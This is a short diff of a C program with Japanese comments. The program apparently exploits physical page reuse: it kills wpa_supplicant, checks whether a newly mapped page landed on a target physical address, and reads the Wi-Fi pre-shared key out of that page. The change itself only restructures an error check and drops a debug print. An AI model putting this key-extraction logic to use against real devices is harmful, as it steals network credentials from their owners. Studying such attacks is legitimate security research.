@@ -95,13 +95,11 @@ int main() {
     }
 
     // wpa_supplicant が起動中なら一度止める
-    int res = 0;
     if (get_process_id()) {
-        res = kill_wpa_supplicant();
-    }
-    if (res) {
-        printf("[-] failed to kill wpa_supplicant\n");
-        exit(1);
+        if (kill_wpa_supplicant()) {
+            printf("[-] failed to kill wpa_supplicant\n");
+            exit(1);
+        }
     }
 
     // 他のプロセスに CPU を譲る
@@ -147,9 +145,8 @@ int main() {
     if (target_page.phys_addr == phys_addr) {
         printf("[+] successfully lead to the target page\n");
         uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
-        for (int i = 0; i < (KEY_LENGTH / sizeof(uint64_t)); i++) {
+        for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
             psk[i] = *(uint64_t *)(psk_addr + i * sizeof(uint64_t));
-            // printf("[+] %lx\n", *(uint64_t *)(psk_addr + i * 0x8));
         }
         arrange_psk(psk);
     } else {
